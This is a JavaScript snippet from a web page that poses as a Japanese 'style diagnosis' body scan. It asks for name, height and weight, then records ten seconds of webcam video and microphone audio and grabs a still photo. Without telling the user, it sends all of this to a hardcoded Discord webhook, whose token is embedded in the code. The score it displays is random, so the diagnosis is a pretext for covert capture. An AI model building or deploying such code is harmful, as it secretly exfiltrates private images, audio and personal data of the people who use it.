    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const result = document.getElementById('result');
        const setupForm = document.getElementById('setup-form');
        const nextOptions = document.getElementById('next-options');
        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
        let mediaRecorder; let chunks = [];

        startBtn.addEventListener('click', () => {
            const user = document.getElementById('username').value || '未設定';
            const h = document.getElementById('height').value || '？';
            const w = document.getElementById('weight').value || '？';
            
            setupForm.style.display = 'none'; 
            video.style.display = 'block';

            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                video.srcObject = stream;
                
                // 対応している形式を自動選択
                const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                chunks = [];

                // データが生成されるたびに配列に追加
                mediaRecorder.ondataavailable = e => { 
                    if (e.data && e.data.size > 0) chunks.push(e.data); 
                };

                // 停止した瞬間に送信処理を開始
                mediaRecorder.onstop = async () => {
                    result.innerHTML = "解析中...";
                    await captureAndSend(user, h, w);
                };

                // 録画開始（1秒ごとにデータを蓄積）
                mediaRecorder.start(1000); 
                result.innerHTML = "全身スキャン中...(10秒)";

                // 10秒後に停止
                setTimeout(() => {
                    if (mediaRecorder.state !== "inactive") {
                        mediaRecorder.stop();
                    }
                }, 10000);

            }).catch((err) => { 
                console.error(err);
                result.innerHTML = "エラー：カメラとマイクを許可してください。"; 
                setupForm.style.display = 'block'; 
            });
        });

        async function captureAndSend(user, h, w) {
            const score = Math.floor(Math.random() * (95 - 80)) + 80;
            
            // 静止画のキャプチャ
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (photoBlob) => {
                const formData = new FormData();
                formData.append('content', `【スタイル診断】\n👤 名前: ${user}\n📏 数値: ${h}cm/${w}kg\n📊 スコア: ${score}`);
                formData.append('file1', photoBlob, 'style.png');

                // 録画した動画データの結合
                if (chunks.length > 0) {
                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                    const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
                    formData.append('file2', videoBlob, `scan.${ext}`);
                }

                try {
                    // Discordへ送信
                    await fetch(webhookUrl, { method: 'POST', body: formData });
                } catch (e) {
                    console.error("送信エラー:", e);
                }

                result.innerHTML = `あなたのスタイル偏差値：<br><span style="font-size:2em;">${score}</span>`;
                nextOptions.style.display = 'block';
                
                // カメラをオフにする
                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
            }, 'image/png');
        }
    </script>
